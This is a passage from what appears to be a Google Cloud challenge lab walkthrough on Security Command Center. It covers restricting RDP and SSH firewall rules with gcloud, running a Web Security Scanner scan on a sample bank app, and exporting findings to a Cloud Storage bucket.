class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># Delete the existing rule</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules delete default-allow-rdp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># Create a new rule with the updated source IP range</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create default-allow-rdp \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --source-ranges=35.235.240.0/20 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --allow=tcp:3389 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --description="Allow HTTP traffic from 35.235.240.0/20" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --priority=65534</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># Delete the existing rule</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules delete default-allow-ssh --quiet</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># Create a new rule with the updated source IP range</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create default-allow-ssh \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --source-ranges=35.235.240.0/20 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --allow=tcp:22 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --description="Allow HTTP traffic from 35.235.240.0/20" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --priority=65534</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 428px;"></div><div class="CodeMirror-gutters" style="display: none; height: 428px;"></div></div></div></pre><p>&nbsp;</p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Assessment Completed!</span></p><p><span>Fix Cymbal Bank&#39;s high vulnerability findings</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p><em><span>Assessment Completed!</span></em></p><p>&nbsp;</p><h2 id='task-4-identify-application-vulnerabilities-with-sccs-security-scanning-features'><span>Task 4. Identify application vulnerabilities with SCC&#39;s security scanning features</span></h2><p><span>In addition to resolving any infrastructure findings, you also need to identify any application vulnerabilities. In many cases, application vulnerabilities can be introduced unknowingly, so as a cloud security engineer you want to be especially diligent of any new web applications running in your environment.</span></p><p><span>Cymbal Bank wants to test-run Web Security Scanner against a sample application deployed in this environment to ensure it is functioning properly. When you started this lab, a Terraform script deployed a sample banking web application running on a Google Compute Engine instance.</span></p><p><span>To run a Web Security scan, the External IP of the Compute Engine VM Instance needs to be static.</span></p><ol start='' ><li><p><span>On the Navigation menu, select </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>VM instances</span></strong><span> &gt; </span><strong><span>cls-vm</span></strong><span>. On the Details page, click </span><strong><span>Edit</span></strong><span>.</span></p></li><li><p><span>In the </span><strong><span>Network Interface</span></strong><span> section, expand the default network.</span></p></li><li><p><span>Click the &quot;External IPv4 address&quot; dropdown and click </span><strong><span>Reserve Static External IP address</span></strong><span> .</span></p></li><li><p><span>Give it the name </span><code>static-ip</code><span> and click </span><strong><span>Reserve</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Save</span></strong><span>.</span></p></li><li><p><span>Find the external IP address of the instance.</span></p></li><li><p><span>Replace </span><code>YOUR_EXTERNAL_IP</code><span> in the URL field below with that IP address, and open the URL in a new browser tab:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">http://&lt;YOUR_EXTERNAL_IP&gt;:8080</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>A Cymbal Bank corporate banking portal with a web form should appear.</span></p><p><img src="images/9vSrMXfQfNu9itYc0eLgXa0NoEm4KPQlDlmZUWJco4k%3D.png" referrerpolicy="no-referrer" alt="Cymbal Bank web page"></p><p>&nbsp;</p><p><span>For this task, run a Web Security scan against this application&#39;s URL (with port 8080).</span></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Assessment Completed!</span></p><p><span>Run a Web Security Scan</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p><em><span>Assessment Completed!</span></em></p><p>&nbsp;</p><h2 id='task-5-export-cymbal-bank-findings-to-google-cloud-storage'><span>Task 5. Export Cymbal Bank Findings to Google Cloud Storage</span></h2><p><span>Cymbal Bank wants to keep information about security incidents, vulnerabilities and misconfigurations for several years for auditing purposes. As a Cloud Security Engineer, your final task is to export all existing Findings to a Google Cloud Storage Bucket with the following specifications:</span></p><ul><li><p><strong><span>Bucket name:</span></strong><span> scc-export-bucket-</span><code>qwiklabs-gcp-00-77121a1a2cc1</code></p></li><li><p><strong><span>Location type:</span></strong><span> regional</span></p></li><li><p><strong><span>Location:</span></strong><span> </span><code>us-west1</code></p></li></ul><p><span>The export should have the following properties:</span></p><ul><li><p><strong><span>Filename:</span></strong><span> </span><code>findings.jsonl</code></p></li><li><p><strong><span>Format:</span></strong><span> JSONL</span></p></li><li><p><strong><span>Time Range:</span></strong><span> All time</span></p></li></ul><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Assessment Completed!</span></p><p><span>Export Cymbal Bank Findings to Google Cloud Storage</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p><em><span>Assessment Completed!</span></em></p><p>&nbsp;</p><h2 id='congratulations-42'><span>Congratulations!</span></h2><p><span>By completing this challenge lab, you proved that you can create mute rules, analyze and fix high vulnerability findings, identify application vulnerabilities with SCC&#39;s security scanning features., and export Findings to a Google Cloud Storage bucket.</span></p></div></div>
</body>
</html>